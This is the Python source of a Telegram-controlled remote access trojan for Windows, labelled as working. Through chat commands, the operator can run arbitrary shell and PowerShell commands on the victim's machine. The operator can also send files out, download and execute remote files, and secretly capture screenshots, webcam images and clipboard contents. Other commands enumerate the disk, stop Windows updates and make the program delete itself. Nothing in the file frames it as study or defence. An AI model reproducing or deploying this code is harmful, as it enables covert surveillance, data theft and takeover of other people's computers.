# WORKING !

import ctypes
import cv2
import pyperclip
import telebot
import platform
import subprocess
from PIL import ImageGrab
import os
import requests
from pathlib import Path
import pyttsx3

BOT_TOKEN = "%token_telegram_bot%"
GROUP_CHAT_ID = "" # put your private chat id here without ""

bot = telebot.TeleBot(BOT_TOKEN)
HOSTNAME = platform.node()
SCRIPT_PATH = os.path.abspath(__file__)

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr


def send_file(filename):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': GROUP_CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Failed to send file.")
            

@bot.message_handler(func=lambda message: str(message.chat.id) == str(GROUP_CHAT_ID))
def handle_message(message):
    text = message.text.strip()

    if text.startswith('!cmd'):
        command = text[5:]
        if command:
            output = execute_command(command)
            bot.reply_to(message, f"Result of command:\n{output}")
        else:
            bot.reply_to(message, "write command after !cmd")
    
    elif text.startswith('!open_url'):
        url = text[10:].strip()
        if url:
            output = execute_command(f'start "" "{url}"')
            bot.reply_to(message, f"URL successfully opened!\n{output}")
        else:
            bot.reply_to(message, "Error opening URL, please provide a valid URL.")

    elif text.startswith('!hide_url'):
        url = text[10:].strip()
        if url:
            output = execute_command(f'curl -s "{url}"')
            bot.reply_to(message, f"URL fetched successfully in hidden mode!\n{output}")
        else:
            bot.reply_to(message, "Error fetching URL in hidden mode, please provide a valid URL.")

    elif text.startswith('!shutdown'):
        output = execute_command('shutdown /s /f /t 0')
        bot.reply_to(message, "PC shutting down...")

    elif text.startswith('!sleep'):
        output = execute_command('rundll32.exe powrprof.dll,SetSuspendState Sleep')
        bot.reply_to(message, "PC going to sleep...")

    elif text.startswith('!update'):
        output = execute_command('powershell Install-Module PSWindowsUpdate -Force; Install-WindowsUpdate -AcceptAll -AutoReboot')
        bot.reply_to(message, "PC updating...")

    elif text.startswith('!hibernate'):
        output = execute_command('shutdown /h')
        bot.reply_to(message, "PC hibernating...")

    elif text.startswith('!restart'):
        output = execute_command('shutdown /r /f /t 0')
        bot.reply_to(message, "PC restarting...")

    elif text.startswith('!stop_updates'):
        output = execute_command('sc stop wuauserv')
        bot.reply_to(message, "Windows updates stopped.")

    elif text.startswith('!shell'):
        command = text[7:]
        if command:
            output = execute_command(f"powershell -Command \"{command}\"")
            bot.reply_to(message, f"Result of powershell command:\n{output}")
        else:
            bot.reply_to(message, "write command after !shell")

    elif text.startswith('!upload'):
        file_path = text[7:].strip()
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"File {file_path}")
        else:
            bot.reply_to(message, "file does not exist.")

    elif text.startswith('!download'):
        file_url = text[10:].strip()
        response = requests.get(file_url)
        if response.status_code == 200:
            file_name = file_url.split('/')[-1]
            with open(file_name, 'wb') as file:
                file.write(response.content)
            output = execute_command(file_name)
            bot.reply_to(message, f"Result of execution of {file_name}:\n{output}")
        else:
            bot.reply_to(message, "Error downloading file.")

    elif text.startswith('!ip'):
        response = requests.get('http://ip-api.com/json')
        if response.status_code == 200:
            data = response.json()
            bot.reply_to(message, f"IP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nTimezone: {data['timezone']}")
        else:
            bot.reply_to(message, "Error get IP informations.")

    elif text.startswith('!kms'):
        os.remove(__file__)
        bot.reply_to(message, "file deleted.")

    elif text.startswith('!sysinfo'):
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        if system_info:
            bot.reply_to(message, '\n'.join(f"{key}: {value}" for key, value in system_info.items()))
        else:
            bot.reply_to(message, "Error get system informations.")
            
    elif text.startswith('!screenshot'):
        file_path = "screenshot.png"
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(file_path)
            print(f"Screenshot saved to {file_path}")
            send_file(file_path)
            os.remove(file_path)
            return "Screenshot sent to Telegram."
        except Exception as e:
            return f"Error taking screenshot: {e}"

    elif text.startswith('!path'):
        bot.reply_to(message, f"Script path: {SCRIPT_PATH}")

    elif text.startswith('!webcam'):
        file_path = "webcam_image.png"
        try:
            cap = cv2.VideoCapture(0)
            ret, frame = cap.read()
            if ret:
                cv2.imwrite(file_path, frame)
                cap.release()
                send_file(file_path)
                os.remove(file_path)
                bot.reply_to(message, "Webcam image captured and sent.")
            else:
                bot.reply_to(message, "Failed to capture image from webcam.")
        except Exception as e:
            bot.reply_to(message, f"Error capturing webcam image: {e}")

    elif text.startswith('!messagebox'):
        message_text = text[12:].strip()
        ctypes.windll.user32.MessageBoxW(0, message_text, "Message has been send to you", 1)
        bot.reply_to(message, "Message box displayed.")

    elif text.startswith('!clipboard'):
        clipboard_text = pyperclip.paste()
        bot.reply_to(message, f"Clipboard contents:\n{clipboard_text}")

    elif text.startswith('!showtask'):
        try:
            tasklist = execute_command('tasklist')
            if len(tasklist) > 4000:
                file_path = "tasklist.txt"
                with open(file_path, 'w') as file:
                    file.write(tasklist)
                send_file(file_path)
                os.remove(file_path)
                bot.reply_to(message, "Task list saved to file and sent.")
            else:
                bot.reply_to(message, f"Task List:\n{tasklist}")
        except Exception as e:
            bot.reply_to(message, f"Error showing task list: {e}")

    elif text.startswith('!kill_task'):
        task_name = text[11:].strip()
        if task_name:
            output = execute_command(f'taskkill /IM "{task_name}" /F')
            bot.reply_to(message, f"Task '{task_name}' killed.\n{output}")
        else:
            bot.reply_to(message, "Please provide the name of the task to kill.")

    elif text.startswith('!speak'):
        text_to_speak = text[7:].strip()
        if text_to_speak:
            engine = pyttsx3.init()
            engine.say(text_to_speak)
            engine.runAndWait()
            bot.reply_to(message, "Text has been spoken.")
        else:
            bot.reply_to(message, "Please provide text to speak.")
            
    elif text.startswith('!folder_path'):
        output_file = 'folder_paths.txt'
        command = f'dir C:\\ /S /B > {output_file}'
        output = execute_command(command)
        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
            send_file(output_file)
            bot.reply_to(message, "Folder paths have been written to file and sent.")
        else:
            bot.reply_to(message, "Failed to create the file.")

    elif text == '!check':
        bot.reply_to(message, f"Connected - {HOSTNAME}")


    elif text == '!help':
        help_text = (
            "<b>!cmd &lt;commande&gt;</b> : <i>run commands.</i>\n"
            "<b>!shell &lt;commande&gt;</b> : <i>run shell commands.</i>\n"
            "<b>!upload &lt;file_path&gt;</b> : <i>download file (enter the file path).</i>\n"
            "<b>!download &lt;file_url&gt;</b> : <i>download file from url and run it.</i>\n"
            "<b>!ip</b> : <i>get IP info of client.</i>\n"
            "<b>!kms</b> : <i>self delete client file.</i>\n"
            "<b>!check</b> : <i>check if the client is connected.</i>\n"
            "<b>!sysinfo</b> : <i>get system informations.</i>\n"
            "<b>!screenshot</b> : <i>get screenshot of client.</i>\n"
            "<b>!hide_url &lt;https://example.com&gt;</b> : <i>open hidden URL.</i>\n"
            "<b>!open_url &lt;https://example.com&gt;</b> : <i>open URL.</i>\n"
            "<b>!shutdown</b> : <i>shut down the PC.</i>\n"
            "<b>!sleep</b> : <i>put the PC to sleep.</i>\n"
            "<b>!update</b> : <i>update the PC.</i>\n"
            "<b>!hibernate</b> : <i>hibernate the PC.</i>\n"
            "<b>!restart</b> : <i>restart the PC.</i>\n"
            "<b>!stop_updates</b> : <i>stop Windows updates.</i>\n"
            "<b>!path</b> : <i>get the path of the script.</i>\n"
            "<b>!webcam</b> : <i>capture an image from the webcam.</i>\n"
            "<b>!messagebox &lt;text&gt;</b> : <i>display a message box with the specified text.</i>\n"
            "<b>!clipboard</b> : <i>get the current clipboard text.</i>\n"
            "<b>!showtask</b> : <i>show the list of open tasks.</i>\n"
            "<b>!kill_task &lt;task_name&gt;</b> : <i>kill the specified task.</i>\n"
            "<b>!speak &lt;text&gt;</b> : <i>read the specified text aloud.</i>\n"
            "<b>!folder_path</b> : <i>get all folder paths on the computer.</i>\n"
        )
        bot.reply_to(message, help_text, parse_mode='HTML')

bot.polling()
